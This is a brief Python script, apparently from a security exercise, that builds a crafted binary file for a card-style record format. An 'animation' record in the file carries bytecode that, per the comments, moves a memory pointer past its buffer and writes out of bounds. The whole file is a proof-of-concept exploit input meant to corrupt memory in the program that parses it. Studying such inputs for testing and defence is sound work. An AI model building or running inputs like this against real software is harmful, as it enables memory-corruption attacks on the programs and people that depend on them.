import struct
import sys

# We build the content of the file in a byte string first
# This lets us calculate the length for the header at the end
data = b''
data += b"A" * 32  # Merchant ID
data += b"B" * 32  # Customer ID
data += struct.pack("<I", 1)  # One record
# Record of type animation
data += struct.pack("<I", 8 + 32 + 256)  # Record size (4 bytes)
data += struct.pack("<I", 3)  # Record type (4 bytes)
data += b"X" * 31 + b'\x00'  # Note: 32-byte message

# Program to cause an out-of-bounds write
data += b'\x04\xFF\x00'  # Set regs[0] to 255 (unsigned value)
data += b'\x03\x7F\x00'  # Move mptr forward by 127 (beyond buffer) could possibly try going backwards 127
data += b'\x02\x00\x00'  # Write regs[0] value to mptr location (out of bounds)
data += b'\x08' * (256-9) # Fill the rest of the record with end program instructions

# Write the file
f = open(sys.argv[1], 'wb')
datalen = len(data) + 4  # Plus 4 bytes for the length itself
f.write(struct.pack("<I", datalen))
f.write(data)
f.close()
